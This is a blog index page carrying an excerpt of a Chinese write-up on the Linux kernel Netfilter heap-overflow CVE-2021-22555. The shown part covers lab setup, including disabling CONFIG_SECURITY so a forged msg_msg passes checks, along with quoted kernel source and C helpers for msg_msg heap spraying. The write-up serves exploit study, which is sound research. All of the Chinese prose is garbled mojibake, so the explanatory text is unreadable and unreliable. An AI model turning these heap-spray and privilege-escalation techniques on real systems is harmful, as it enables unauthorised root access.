<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">CVE-2021-22555</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-04-15</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-05-24</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ç¯å¢ƒæ­å»º"   >
          <a href="#ç¯å¢ƒæ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1>
      <p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æˆ–è€…æˆ‘å†™çš„èœé¸¡é¡¹ç›®ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll.git" >KernelAll</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="ğŸ”ºæ³¨ï¼š"   >
          <a href="#ğŸ”ºæ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h2>
      <p>æ³¨æ„çš„æ˜¯ï¼Œåœ¨æˆ‘å†™çš„é¡¹ç›®é‡Œçš„CVEç¯å¢ƒä¸­ï¼Œå»æ‰äº†é…ç½®ï¼š<code>CONFIG_SECURITY=n</code>ï¼ŒåŸå› æ˜¯åœ¨<code>load_msg()</code>å‡½æ•°ä¸­ç”³è¯·<code>msg_msg</code>ç»“æ„ä½“æ—¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œä¼šè°ƒç”¨åˆ°<code>security_msg_msg_alloc()</code>å‡½æ•°ï¼Œç»™<code>msg_msg</code>ç»“æ„ä½“ä¸­çš„<code>security</code>æŒ‡é’ˆèµ‹å€¼ï¼Œå¯¼è‡´ä¸‹é¢æ¼æ´åˆ©ç”¨æ—¶è¯»å–ä¼ªé€ <code>msg_msg</code>ç»“æ„ä½“ç”±äºæ£€æµ‹<code>security</code>å¯¼è‡´å‡ºé”™ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /ipc/msgutil.c</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è€Œå»æ‰äº†é…ç½®ï¼š<code>CONFIG_SECURITY=n</code>ï¼Œå¯ä»¥ä¸ç”¨<code>security</code>æŒ‡é’ˆï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºé”™äº†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/security.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq, struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct task_struct *target, <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* CONFIG_SECURITY */</span></span></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					       <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct task_struct *target,</span></span></span><br><span class="line"><span class="params"><span class="function">					    <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>	<span class="comment">/* CONFIG_SECURITY */</span></span></span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯åœ¨<code>bsauce</code>å¸ˆå‚…æä¾›çš„ç¯å¢ƒä¸­æœ‰æ·»åŠ è¯¥é…ç½®ï¼Œè€Œ<code>security</code>æŒ‡é’ˆçš„å€¼å´è¿˜æ˜¯ä¸ºç©ºã€‚ç®€å•çœ‹äº†ä¸€ä¸‹æºç ï¼Œå¦‚ä¸‹å‡½æ•°é“¾</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_msg()-&gt;security_msg_msg_alloc()-&gt;lsm_msg_msg_alloc()</span><br></pre></td></tr></table></div></figure>

<p>å¯¹äº<code>lsm_msg_msg_alloc()</code>å‡½æ•°å¦‚ä¸‹å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lsm_msg_msg_alloc</span><span class="params">(struct msg_msg *mp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (blob_sizes.lbs_msg_msg == <span class="number">0</span>) &#123;</span><br><span class="line">		mp-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mp-&gt;security = kzalloc(blob_sizes.lbs_msg_msg, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (mp-&gt;security == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿›è¡Œç›¸å…³èµ‹å€¼ï¼Œå¦‚æœæ»¡è¶³<code>blob_sizes.lbs_msg_msg == 0</code>é‚£ä¹ˆå…¶<code>security</code>æŒ‡é’ˆä¸ºç©ºï¼Œåç»­æ£€æµ‹æ—¶ä¹Ÿä¾æ®æ­¤åˆ¤æ–­ä¸æ£€æµ‹ã€‚è€Œå¯¹äºè¿™ä¸ª<code>blob_sizes.lbs_msg_msg</code>ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå¯èƒ½æ˜¯æˆ‘çš„ç›¸å…³é…ç½®é—®é¢˜å§ã€‚è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘å°±ç›´æ¥å°†è¿™ä¸ªé…ç½®å»æ‰äº†ã€‚</p>
<p>æ­¤å¤–ç»è¿‡å®é™…æµ‹è¯•ï¼Œæºç ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œå…¶å®<code>security</code>ä¹Ÿå°±æ˜¯ä¸€ä¸ªå †åœ°å€(ä»¥0x8é€’å¢)ï¼Œæ˜¯ä¸æ–­å˜åŒ–çš„ï¼Œä½†æ˜¯å¦‚æœèƒ½æ³„éœ²å‡ºå…¶ä¸­ä¸€ä¸ªï¼Œé‚£ä¹ˆåç»­æ£€æµ‹å°±èƒ½éƒ½é€šè¿‡äº†ã€‚</p>

        <h1 id="å‰ç½®çŸ¥è¯†"   >
          <a href="#å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1>
      <p>å®Œæˆè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨è¿˜æ˜¯éœ€è¦ä¸€äº›å‰ç½®çŸ¥è¯†çš„ï¼Œåˆšå¥½åˆ©ç”¨è¿™ä¸ªæ¼æ´é‡æ–°å®Œå–„ä¸€ä¸‹ç›¸å…³çš„çŸ¥è¯†ç‚¹ã€‚</p>

        <h2 id="1-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024"   >
          <a href="#1-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024" class="headerlink" title="1.msg_msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024"></a>1.msg_msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024</h2>
      <p>è¿™ä¸ªåœ¨ä¹‹å‰ä¹Ÿæ€»ç»“è¿‡ï¼Œä¸è¿‡æ€»ç»“å¾—æœ‰äº›é”™è¯¯ï¼Œä¹Ÿä¸å¤ªå®Œå–„ï¼Œè¿™é‡Œå†å¥½å¥½æ€»ç»“ä¸€ä¸‹</p>
<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#%E5%88%86%E9%85%8D%EF%BC%88GFP-KERNEL-ACCOUNT%EF%BC%89%EF%BC%9Amsgsnd-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" >ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252558" >Linuxå†…æ ¸ä¸­åˆ©ç”¨msg_msgç»“æ„å®ç°ä»»æ„åœ°å€è¯»å†™ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html" >Linuxçš„è¿›ç¨‹é—´é€šä¿¡ - æ¶ˆæ¯é˜Ÿåˆ— Â· Poor Zorroâ€™s Linux Book (gitbooks.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹</p>
<p>è™½ç„¶å†™çš„æ˜¯æœ€å¤§<code>kmalloc-1024</code>ï¼Œä½†æ˜¯åœ¨å †å–·æ—¶ï¼Œå¯ä»¥è¿ç»­<code>kmalloc(1024)</code>ä»è€Œè·å¾—è¿ç»­çš„å †å†…å­˜åˆ†å¸ƒï¼Œè¿™æ ·éƒ½é‡Šæ”¾æ‰ä¹‹åå†ç»è¿‡å›æ”¶æœºåˆ¶å°±å¯ä»¥ç”³è¯·åˆ°æ›´å¤§çš„<code>kmallo-xx</code>äº†ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º"   >
          <a href="#â‘ åˆ›å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <ul>
<li><p>é¦–å…ˆåˆ›å»º<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œå¯¹åº”äºå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//keyè¦ä¹ˆä½¿ç”¨ftok()ç®—æ³•ç”Ÿæˆ,è¦ä¹ˆæŒ‡å®šä¸ºIPC_PRIVATE</span></span><br><span class="line"><span class="comment">//ä»£è¡¨ç€è¯¥æ¶ˆæ¯é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­å”¯ä¸€çš„æ ‡è¯†ç¬¦</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨IPC_PRIVATEä¼šç”Ÿæˆå…¨æ–°çš„æ¶ˆæ¯é˜Ÿåˆ—IPCå¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ç®€å•å°è£…çš„<code>msgget</code>å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å·<code>__NR_msgget</code>ï¼Œä¹‹åä¿å­˜æ•°æ®çš„æ¶ˆæ¯å°±ä¼šåœ¨è¿™ä¸ª<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œä»¥åŠå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„ä¸‹è¿›è¡Œåˆ›å»º</p>
</li>
</ul>

        <h4 id="â‘¡æ•°æ®ä¼ è¾“"   >
          <a href="#â‘¡æ•°æ®ä¼ è¾“" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æ•°æ®ä¼ è¾“" class="headerlink" title="â‘¡æ•°æ®ä¼ è¾“"></a>â‘¡æ•°æ®ä¼ è¾“</h4>
      <ul>
<li><p>å†™å…¥æ¶ˆæ¯ï¼š</p>
<p>ç„¶åå°±å¯ä»¥ä¾æ®<code>queue_id</code>å†™å…¥æ¶ˆæ¯äº†ï¼Œä¸åŒäº<code>pipe</code>å’Œ<code>socketpair</code>ï¼Œè¿™ä¸ªéœ€è¦ç‰¹å®šçš„å°è£…å‡½æ•°ï¼ˆ<code>msgsnd/msgrcv</code>ï¼‰æˆ–è€…å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆ<code>__NR_msgrcv/__NR_msgsnd</code>ï¼‰æ¥å®ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//msg_bufå®é™…ä¸Šä¸ºmsgp,é‡Œé¢åŒ…å«mtype,è¿™ä¸ªmtypeåœ¨åé¢çš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">msg *message = (msg *)queue_send_buf;</span><br><span class="line">message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>è¯»å–æ¶ˆæ¯ï¼š</p>
<p>ä¹‹åå³å¯ä¾æ®<code>queue_id</code>è¯»å–æ¶ˆæ¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>mtype</code></p>
